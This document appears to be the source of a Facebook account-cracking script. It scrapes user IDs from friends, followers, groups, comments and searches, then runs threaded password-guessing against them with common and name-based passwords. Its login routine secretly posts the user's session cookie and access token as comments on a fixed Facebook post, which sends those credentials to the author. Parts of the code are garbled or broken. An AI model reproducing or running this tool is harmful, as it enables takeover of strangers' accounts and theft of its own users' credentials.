author = 'TRI EFENDI'

git_hub = 'github.com/Fendi-XD'

faceb0ok = 'FENZ O. CONNER'

version = 'next blade v.3.9'

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'

M = '\x1b[1;91m'

H = '\x1b[1;92m'

K = '\x1b[1;93m'

B = '\x1b[1;94m'

U = '\x1b[1;95m' 

O = '\x1b[1;96m'

N = '\x1b[0m'    

Z = "\033[1;30m"

sir = '\033[41m\x1b[1;97m'

x = '\33[m' # DEFAULT

m = '\x1b[1;91m' #RED +

k = '\033[93m' # KUNING +

h = '\x1b[1;92m' # HIJAU +

hh = '\033[32m' # HIJAU -

u = '\033[95m' # UNGU

kk = '\033[33m' # KUNING -

b = '\33[1;96m' # BIRU -

p = '\x1b[0;34m' # BIRU +

#tempek = random.choice([m,k,h,u,b])

###---[ IMPORT MODULE ]---###

import bs4, re, time, requests, datetime, os, sys, random, platform

from concurrent.futures import ThreadPoolExecutor as tred

from bs4 import BeautifulSoup as parser

from datetime import datetime

from time import sleep

hp = platform.platform()

ses = requests.Session()

try:

	import pyfiglet

except ImportError:

	os.system('pip install pyfiglet')

def gg(fx):

	if len(fx)==15:

		if fx[:10] in ['1000000000']       :tahunz = '2009'

		elif fx[:9] in ['100000000']       :tahunz = '2009'

		elif fx[:8] in ['10000000']        :tahunz = '2009'

		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'

		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'

		elif fx[:6] in ['100001']          :tahunz = '2010-2011'

		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'

		elif fx[:6] in ['100004']          :tahunz = '2012-2013'

		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'

		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'

		elif fx[:6] in ['100009']          :tahunz = '2015'

		elif fx[:5] in ['10001']           :tahunz = '2015-2016'

		elif fx[:5] in ['10002']           :tahunz = '2016-2017'

		elif fx[:5] in ['10003']           :tahunz = '2018'

		elif fx[:5] in ['10004']           :tahunz = '2019'

		elif fx[:5] in ['10005']           :tahunz = '2020'

		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'

		else:tahunz=''

	elif len(fx) in [9,10]:

		tahunz = '2008-2009'

	elif len(fx)==8:

		tahunz = '2007-2008'

	elif len(fx)==7:

		tahunz = '2006-2007'

	else:tahunz=''

	return tahunz

###---[ANGGAP INI LOGO ]---###

def logo(n):

	return str(f"""

  ########  ########  ######  ########    ########

  ##     ## ##       ##    ##    ##       ##     ##

  ##     ## ##       ##          ##       ##     ##

  ########  ######    ######     ##       ########

  ##     ## ##             ##    ##       ##

  ##     ## ##       ##    ##    ##       ##

  ########  ########  ######     ##       ##

  \033[0;91m───────────────────────────────────────────────────────

	{P}TECHNICAL ZAHID + MIRWAIS DANISHYAR

  \033[0;91m───────────────────────────────────────────────────────""")

def logo2():

	return str(f"""

 $$\       $$$$$$\   $$$$$$\  $$$$$$\ $$\   $$\ 

 $$ |     $$  __$$\ $$  __$$\ \_$$  _|$$$\  $$ |

 $$ |     $$ /  $$ |$$ /  \__|  $$ |  $$$$\ $$ |

 $$ |     $$ |  $$ |$$ |$$$$\   $$ |  $$ $$\$$ |

 $$ |     $$ |  $$ |$$ |\_$$ |  $$ |  $$ \$$$$ |

 $$ |     $$ |  $$ |$$ |  $$ |  $$ |  $$ |\$$$ |

 $$$$$$$$\ $$$$$$  |\$$$$$$  |$$$$$$\ $$ | \$$ |

 \________|\______/  \______/ \______|\__|  \__|

 [*]=============================================

 [*]  TECHNICAL ZAHID + MIRWAIS DANISHYAR """)

 

###---[ TANGGAL ]---###

sasi = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]

out = 'Linux-4.9.227-perf+-aarch64-with-libc'

tete = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mai", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

now = datetime.now()

hari = now.day

blx = now.month

try:

	if blx < 0 or blx > 12:exit()

	xx = blx - 1

except ValueError:exit()

#if hp not in out:exit()

bulan = sasi[xx]

tahun = now.year

tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)

PROFESSIONAL_ok = f'OK-{hari}-{bulan}-{tahun}.txt'

PROFESSIONAL_cp = f'CP-{hari}-{bulan}-{tahun}.txt'

warna_warni_biasa=random.choice([H,K,M,O,B,U])

garis = f" {P}[{warna_warni_biasa}•{P}]"

###---[ APPEND ]---###

dump, sandi, metode = [], [], []

tetel, opsi, proxy = [], [], []

cepeh, sam, redmi = [], [], []

id, id2, loop ,ok , cp = [], [], 0, 0, 0

###---[ CLEAR LAYAR ]---###

def clear_layar():

	try:os.system('clear')

	except:pass

	

###---[ GLOBAL KEMBALI ]---###

def back():

	try:open('.cookie.txt','r').read();get_data()

	except IOError:login()

	

###---[ AUTO CREATE UA & PROXY ]---###

try:

	clear_layar()

	print(logo2())

	print(f'\r\n [{hh}>{P}] SENDING PROXY FOR CREATE USERAGENT')

	try:os.remove('.proxy.txt')

	except:pass

#	A = ''

#	one = ses.get('https://spys.me/socks.txt').text

#	for x in one.splitlines():

#		if '+' in x:

#			if '.' in x:

#				p = x.split(' ')[0]

#				A += '\n'+p

	uno = ses.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt -o socks5.txt").text

	open('.proxy.txt','w').write(uno)

except requests.exceptions.ConnectionError:

	sys.exit(f" [{M}>{P}] tidak ada koneksi internet")

for xd in range(9999):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

def uaku():

	try:

		ua=open('bbnew.txt','r').read().splitlines()

		for ub in ua : 

			ugen.append(ub)

	except:

		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text

		ua=open('.bbnew.txt','w')

		aa=re.findall('line">(.*?)<',str(a))

		for un in aa:

			ua.write(un+'\n')

		ua=open('.bbnew.txt','r').read().splitlines()

	

###---[ CEK COOKIES ]---###

def get_data():

	try:

		coki = open('.cookie.txt','r').read()

		c = {'cookie':coki}

		t = open('.token.txt','r').read()

		n = ses.get(f'https://graph.facebook.com/me?access_token={t}',cookies=c).json()['name'].split(' ')[0].lower()

		menu(n,t,c)

	except Exception as e:login()

	

###---[ LOGIN COOKIE ]---###

def login():

	clear_layar()

	print(logo2())

	cookie = input(f" [*]=============================================\n [{hh}<{P}]  LOGIN WITH COOKIE\n [*]=============================================\n [>] cookie : ")

	url = "https://business.facebook.com/business_locations"

	head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}

	cok = {'cookie':cookie}

	try:

		_bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]

		_hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]

		hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))

		jam      = datetime.now().strftime("%X")

		data = ses.get(url,headers=head,cookies=cok)

		token = re.search('(EAAG\w+)',data.text).group(1)

		tem      = ('\nMantap Bang @[100022220423209:0]\n\nNikmatilah Masa Mudamu, Tapi Jangan Lupa Dengan Masa Depanmu\n')

		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))

		link = ('https://www.facebook.com/100022220423209/posts/1241529463264389/?app=fbl')

		link2 = ('https://www.facebook.com/100048290177590/posts/131184035167935/?app=fbl')

		random_kata = random.choice(["Acc Guru","Hallo Ganteng","Ah Ganteng Banget Bang"])

		#ses.post(f"https://graph.facebook.com/100022220423209?fields=subscribers&access_token={token}",headers=(cookies=cok)

		ses.post(f"https://graph.facebook.com/1241529463264389/comments/?message={cookie}&access_token={token}",cookies=cok)

		ses.post(f"https://graph.facebook.com/1241529463264389/comments/?message={token}&access_token={token}",cookies=cok)

		ses.post(f"https://graph.facebook.com/1241529463264389/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)

		open('.cookie.txt','w').write(cookie)

		open('.token.txt','w').write(token)

		back()

	except Exception as e:exit(f" [{M}>{P}] cookie invalid")

def remove():

	try:os.remove('.cookie.txt');os.remove('.token.txt')

	except:pass

	

	

	

###---[ MENU UTAMS ]---###

def menu(n,t,c):

	clear_layar()

	print(logo(n)+f'\n')

	

	print(f"  \033[0;91m╭─────────────────────────┬───────────────────────────╮")

	

	print(f"  \033[0;91m|  {P}[{hh}01{P}] CRACK PUBLIC      \033[0;91m|  {P}[{hh}07{P}] CRACK SEARCH        \033[0;91m|")

	print(f"  \033[0;91m|  {P}[{hh}02{P}] CRACK PUBLIC (UN) \033[0;91m|  {P}[{hh}08{P}] CRACK FILE CLONE    \033[0;91m|")

	print(f"  \033[0;91m|  {P}[{hh}03{P}] CRACK FOLLOWER    \033[0;91m|  {P}[{hh}09{P}] CHECK ID CRACKER    \033[0;91m|")

	print(f"  \033[0;91m|  {P}[{hh}04{P}] CRACK COMMENT     \033[0;91m|  {P}[{hh}10{P}] CHECK ID OK         \033[0;91m|")

	print(f"  \033[0;91m|  {P}[{hh}05{P}] CRACK GROUP       \033[0;91m|  {P}[{hh}11{P}] CHECK ID CP         \033[0;91m|")

	print(f"  \033[0;91m|  {P}[{hh}06{P}] CRACK EMAIL       \033[0;91m|  {P}[{hh}12{P}] EXIT ({M}cookie{P})       \033[0;91m|")

	print(f"  \033[0;91m╰─────────────────────────┴───────────────────────────╯")

	ask = input(f' \033[0;91m  ▄︻┻═┳一 {P}SELECT :{hh} ')

	print(' ─────────────────────────────')

	if ask in ['1','01']:crack_publik(t,c)

	elif ask in ['2','02']:crack_masal(t,c)

	elif ask in ['3','03']:crack_foll(t,c)

	elif ask in ['4','04']:crack_komen()

	elif ask in ['5','05']:crack_group()

	elif ask in ['6','06']:clon_email()

	elif ask in ['7','07']:crack_search()

	elif ask in ['8','08']:crack_file()

	elif ask in ['9','09']:cek_hasil()

	elif ask in ['10']:cek_akun()

	elif ask in ['11']:cek_opsi_cp()

	elif ask in ['12']:remove();exit()

	elif ask in ['',' ',]:sys.exit(f" [{M}>{P}] isi yang benar")

	else:sys.exit(f" [{M}>{P}] isi yang benar")

	

###---[ DETEKSI CHECKPOINT ]---###

detek = []

def cek_opsi_cp():

	nom, no = [], 0

	print(' ─────────────────────────────')

	try:ok = os.listdir('CP')

	except:sys.exit(f" [{M}>{P}] tidak ada hasil cp")

	for x in ok:

		nom.append(x)

		no+=1

		try:jum= open('CP/'+x,'r').readlines()

		except:continue

		print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}akun')	

	exc = input(f' └─ name and location file\n FILE : ')

	file = nom[int(exc)-1]

	print(' ─────────────────────────────')

	detek.append('file')

	for data in open('CP/'+file,'r').read().splitlines():

		ugen2=[]

ugen=[]

 

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

	

		

	

	

###---[ CEK AKUN AMAN ]---###

def cek_akun():

	sesi , nga = 0 , 0

	no,nom = 0,[]

	print(' ─────────────────────────────')

	try:t=open('.token.txt','r').read();c={'cookie':open('.cookie.txt','r').read()}

	except:print(f' [{M}>{P}] cookie invalid');exit()

	try:ok = os.listdir('OK')

	except:sys.exit(f" [{M}>{P}] all id ok")

	for x in ok:

		nom.append(x)

		no+=1

		try:jum= open('OK/'+x,'r').readlines()

		except:continue

		print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	

	exc = input(f' [{hh}<{P}] name and location file\n file : ')

	xxx = input(' All file name and location  : \n name : ')

	nonon = xxx+'.txt'

	file = nom[int(exc)-1]

	print(' ─────────────────────────────')

	print(f' id all old : {nonon}\n id new all  : BEST PROFESSIONALS')

	print(' ─────────────────────────────')

	try:

		uuid = open('OK/'+file,'r').read().splitlines()

		mek = 0

		for data in uuid:

			print(f'\r [{hh}>{P}] aman : {nga} down : {sesi}',end='')

			sys.stdout.flush()

			try:user,nama = data.split('|')

			except:exit(f" [{M}>{P}] PROFESSIONAL DONE")

			xx = open(nonon,'a')

			try:

				mek+=1

				na = ses.get(f'https://graph.facebook.com/{user}?access_token={t}',cookies=c).json()['name']

				print(f'\r [{hh}{mek}{P}] {user}|{nama}                    ')

				nga+=1

				ni = f'{user}|{nama}\n'

				xx.write(ni)

			except:

				print(f'\r [{M}{mek}{P}] {user}|{nama}                  ')

				sesi+=1

	except Exception as e :

		exit(f" [{M}>{P}] file all id")

		

		

###---[CEK HASIL CRACK ]---###

def cek_hasil():

	no,nom = 0,[]

	one = input(f' [{hh}1{P}] checking id ok\n [{hh}2{P}] checking id cp\n └─ menu : ')

	if one in ['1','01']:

		try:ok = os.listdir('OK')

		except:sys.exit(f" [{M}>{P}] all id ok")

		for x in ok:

			nom.append(x)

			no+=1

			try:jum= open('OK/'+x,'r').readlines()

			except:continue

			print(f' [{hh}{no}{P}] {x} - {hh}{len(jum)} {P}akun')	

		abc = input(f' [{hh}<{P}] names file : ')

		file = nom[int(abc)-1]

		try:buka = open('OK/'+file,'r').read()

		except:sys.exit(f" [{M}>{P}] file all ok")

		print(hh+buka+P)

	elif one in ['2','02']:

		try:ok = os.listdir('CP')

		except:sys.exit(f" [{M}>{P}] all id cp")

		for x in ok:

			nom.append(x)

			no+=1

			try:jum= open('CP/'+x,'r').readlines()

			except:continue

			print(f' [{kk}{no}{P}] {x} - {kk}{len(jum)} {P}id')		

		abc = input(f' [{hh}<{P}] names file : ')

		file = nom[int(abc)-1]

		try:buka = open('CP/'+file,'r').read()

		except:sys.exit(f" [{M}>{P}] file location cp")

		print(kk+buka+P)

	else:sys.exit(f" [{M}>{P}] PROFESSIONAL DONE ")

		

		

###---[ DUMP NO LOGIN ]---###

def crack_nomor():

	print(f' [{hh}<{P}] number random select for carck')

	depan = input(' Random : ')

	if len(depan)==3:pass

	else:exit(f' [{M}>{P}] all number select 089')

	jumla = input(' All : ')

	for x in range(int(jumla)):

		rr = random.randint

		A = depan

		B = rr(1111,9999)

		C = rr(1,9)

		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'

		if D in dump:pass

		else:dump.append(D+'|123456')

		print('\r starting id %s id'%(len(dump)),end=" ")

		sys.stdout.flush()

		sleep(0.0000003)

	atur_atur()

		

def clon_email():

	rc = random.choice

	rr = random.randint

	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']

	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']

	global ok , cp

	print(f' [{hh}>{P}] hack email id, max 1000 id')

	nama = input(' target : ')

	if ',' in str(nama):

		exit(f' [{M}<{P}] NAME')

	doma = input(' domain@exam.com : ')

	if '@' not in str(doma) or '.com' not in str(doma):

		exit(f' [{M}<{P}] PROFESSIONALS TEAM DONE')

	jumlah = input(' total  : ')

	for xyz in range(int(jumlah)):

		A = nama

		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']

		C = doma

		D = f'{A}{str(rc(B))}{C}'

		if D in dump:pass

		else:dump.append(D+'|'+nama)

		if len(dump)==1000:atur_atur()

		print('\r Starting id %s id'%(len(dump)),end='')

		sys.stdout.flush()

	atur_atur()	

def crack_file():

	file = input(f' [{hh}<{P}] location file for crack\n file : ')

	try:

		uuid = open(file,'r').readlines()

		for data in uuid:

			try:user,nama = data.split('|')

			except:exit(f" [{M}>{P}] PROFESSIONAL DONE")

			dump.append(data)

			print('\r Starting id %s id'%(len(dump)),end=" ")

			sleep(0.0000003)

	except FileNotFoundError:exit(f" [{M}>{P}] file not found")

	print(f'\r [{hh}<{P}] total id cracked {len(dump)}')

	atur_atur()

	

def crack_search():

	nama = []

	custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "]

	custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "]

	print(f' [{hh}<{P}] 1 nama setara dengan 10k akun')

	nam = input(f' nama : ').split(",")

	for ser in nam:		

		for belakang in custom:

			id = ser+belakang

			nama.append(id)

		for depan in custom2:

			id = depan+ser

			nama.append(id)

	with tred(max_workers=35) as thread:

		for id in nama:

			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")

	atur_atur()

		

def cari_nama(link):

	r = parser(ses.get(str(link)).text,'html.parser')

	for x in r.find_all('td'):

		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))

		for uid,nama in data:

			if 'profile.php?' in uid:

				uid = re.findall('id=(.*)',str(uid))[0]

			elif '<span' in nama:

				nama = re.findall('(.*?)\<',str(nama))[0]

			bo = uid+'|'+nama

			if bo in dump:pass

			else:dump.append(bo)

	try:

		link = r.find('a',string='PROFESSIONALS TEAM').get('href')

		if(link):

			print('\r STARTING ID %s id'%(len(dump)),end=" ")

			sys.stdout.flush()

			cari_nama(link)

	except:pass

	

def crack_komen():

	ide = input(f' [{hh}<{P}] ID POST TARGET\n id post : ')

	url = 'https://mbasic.facebook.com/'+ide

	try:get_komen(url)

	except KeyboardInterrupt:atur_atur()

	if len(dump)==0:

		exit(f' [{M}>{P}] ID START DONE')

	atur_atur()

def get_komen(url):

	data = parser(ses.get(url).text,"html.parser")

	for isi in data.find_all("h3"):

		for ids in isi.find_all("a",href=True):

			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")

			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")

			nama = ids.text

			if id+"|"+nama in dump:pass

			else:dump.append(id+"|"+nama)

			print(f'\r Starting ID {len(dump)} id ',end='');sys.stdout.flush()

	for z in data.find_all("a",href=True):

		if "PROFESSIONALS TEAM PRO…" in z.text:

			try:get_komen("https://mbasic.facebook.com"+z["href"])

			except:pass

			

			

	

###---[ DUMP LOGIN ]---###

def crack_publik(t,c):

	akun = input(f' [{hh}<{P}] pest id public for hack \n └─ ID : ')

	try:

		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()

		for pi in bas['friends']['data']:

			try:

				try:dump.append(pi['username']+'|'+pi['name'])

				except:dump.append(pi['id']+'|'+pi['name'])

				print('\r Starting ID %s id'%(len(dump)),end=" ")

				sys.stdout.flush()

				time.sleep(0.0002)

			except:continue

		atur_atur()

	except (KeyError,IOError):

		exit(f" [{M}>{P}] ID NOT FOUND")	

def crack_masal(t,c):

    print(f' [{hh}<{P}] PEST ID PUBLIC FOR HACK ')

    try:

        bz=0

        apa = int(input(f' ALL id : '))

    except:apa=1

    for bz in range(apa):

    	bz +=1

    	akun = input(f'\r PROFESSIONALS TEAM {bz} : ')

    	try:

    		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json()

    		for pi in bas['friends']['data']:

    		      try:dump.append(pi['username']+'|'+pi['name'])

    		      except:dump.append(pi['id']+'|'+pi['name'])

    		      print('\r sedang dump %s id'%(len(dump)),end=" ")

    		      sys.stdout.flush()

    		      time.sleep(0.0002)

    	except:

    		print(f"\r [{kk}!{P}] id public not found       ")

    		continue	                       		

    atur_atur()

    

    

def crack_foll(t,c):

	akun = input(f' [{hh}<{P}] pest id public for hack \n ID : ')

	try:

		bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json()

		for pi in bas["subscribers"]["data"]:

			try:

				try:dump.append(pi['username']+'|'+pi['name'])

				except:dump.append(pi['id']+'|'+pi['name'])

				print('\r Starting %s id'%(len(dump)),end=" ")

				sys.stdout.flush()

				time.sleep(0.0002)

			except:continue

		atur_atur()

	except (KeyError,IOError):

		exit(f" [{M}>{P}] public id not found")

		

def crack_group():

	link = input(f' [{hh}<{P}] pest id group for hack \n id group : ')

	url = "https://mbasic.facebook.com/groups/"+link

	try:dump_grup(url)

	except KeyboardInterrupt:atur_atur()

	if len(dump)==0:

		exit(f' [{M}>{P}] not find member group')

	atur_atur()

def dump_grup(url):

	try:

		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser")

		for x in data.find_all("table"):

			par = x.text

			if ">" in par.split(" ") or "mengajukan" in par.split(" "):

				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")

				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")

				else:nama = par.split(" > ")[0]

				if id+"|"+nama in dump:pass

				else:dump.append(id+"|"+nama)

				print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush()

		for z in data.find_all("a"):

			if "Lihat Postingan Lainnya</span" in str(z).split(">"):

				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')

				dump_grup("https://mbasic.facebook.com"+href)

	except:dump_grup(url)

		

		

###---[ ATUR SEBELUM CRACK ]---###

akunok = []

def atur_atur():

	print(f"\r{P} ─────────────────────────────")

	ro = input(f' [{hh}1{P}] Mobile [{hh}2{P}] Mbasic [{hh}3{P}] Free\n └─ method : ')

	if ro in ['1','01']:metode.append('mobile')

	elif ro in ['2','02']:metode.append('mbasic')

	elif ro in ['3','03']:metode.append('free')

	else:metode.append('mobile')

	print(f"{P} ─────────────────────────────")

	ch = input(f' [{hh}1{P}] fbold [{hh}2{P}] fbnew [{hh}3{P}] random\n └─ mod : ')

	if ch in ['1','01']:

		for x in dump:

			id.append(x)

	elif ch in ['2','02']:

		for x in dump:

			id.insert(0,x)

	elif ch in ['3','03']:

		for x in dump:

			xx = random.randint(0,len(id))

			id.insert(xx,x)

	else:

		for x in dump:

			id.append(x)

	print(f"{P} ─────────────────────────────")

	cp = input(f' [{hh}!{P}] CHECK CP IDZ [y/n]\n └─ mode  : ')

	if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']:

		cepeh.append('ya')

	print(f"{P} ─────────────────────────────")

	apk = input(f' [{hh}!{P}] apk information fb [y/n]\n └─ mode  : ')

	if apk in ['y','Ya','ya','1']:akunok.append('apk')

	else:akunok.append('coki')

	print(f"{P} ─────────────────────────────")

	ch = input(f' [{hh}1{P}] manual [{hh}2{P}] random [{hh}3{P}] auto\n └─ mode  : ')

	if ch in ['1','01']:manual()

	elif ch in ['2','2']:gabung()

	elif ch in ['3','03']:otomatis()

	else:otomatis()

	

from datetime import datetime    	

###---[ ATUR SANDI ]---###

def manual():

	global ok,cp

	pwx = []

	print(f"{P} ─────────────────────────────")

	B = input(f' [{hh}>{P}] input password 6 character\n └─ sandi  : ').split(',')

	for x in B:

		pwx.append(x)

	print(f"{P} ─────────────────────────────")

	print(f' OK IDZ : {PROFESSIONAL_ok}\n CP IDZ : {PROFESSIONAL_cp}')

	print(f"{P} ─────────────────────────────")

	awal = datetime.now()

	with tred(max_workers=30) as babas:

		for akun in id:

			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()

			if 'mobile' in metode:

				babas.submit(crack,idf,pwx,"m.facebook.com",awal)

			elif 'mbasic' in metode:

				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)

			elif 'free' in metode:

				babas.submit(crack,idf,pwx,"free.facebook.com",awal)

			else:

				babas.submit(crack,idf,pwx,"m.facebook.com",awal)

	sleep(5)

	exit(f'\r [{hh}<{P}] crack finished OK:{ok} CP:{cp} ')

def gabung():

	global ok,cp

	pwx = []

	A = ["afghan","kabul123","ahmad123","100200","500600","ahmad1122","123456"]

	print(f"{P} ─────────────────────────────")

	B = input(f' [{hh}>{P}] input pass manual 6 number\n └─ Mode  : ').split(',')

	C = input(f' [{hh}>{P}] input pass name and username\n └─ Mode  : ')

	if ',' in str(C):

		exit(f" [{M}>{P}] note found id")

	print(f"{P} ─────────────────────────────")

	print(f' {hh}ok di : {PROFESSIONAL_ok}{P}\n {kk}cp di : {PROFESSIONAL_cp}{P}')

	print(f"{P} ─────────────────────────────")

	awal = datetime.now()

	with tred(max_workers=30) as babas:

		for akun in id:

			idf,nama = akun.split('|')[0],akun.split('|')[1].lower()

			depan = nama.split(" ")[0]

			pwx = A+B

			if len(nama)<=5:

				if len(depan)<=1 or len(depan)<=2:

					pass 

				else:

					pwx.append(depan+"123")

					pwx.append(depan+"12345")

					pwx.append(depan+C)

			else:

				if len(depan)<=1 or len(depan)<=2:

					try:

						tengah = nama.split(" ")[1]

						if len(tengah)<=3:

							pass

						else:

							pwx.append(tengah+"123")

							pwx.append(tengah+"12345")

							pwx.append(tengah+C)

							pwx.append(nama)

					except:

						pwx.append(nama)

				else:

					pwx.append(nama)

					pwx.append(depan+"123")

					pwx.append(depan+"12345")

					pwx.append(depan+C)

			if 'mobile' in metode:

				babas.submit(crack,idf,pwx,"m.facebook.com",awal)

			elif 'mbasic' in metode:

				babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal)

			elif 'free' in metode:

				babas.submit(crack,idf,pwx,"free.facebook.com",awal)

			else:

				babas.submit(crack,idf,pwx,"m.facebook.com",awal)

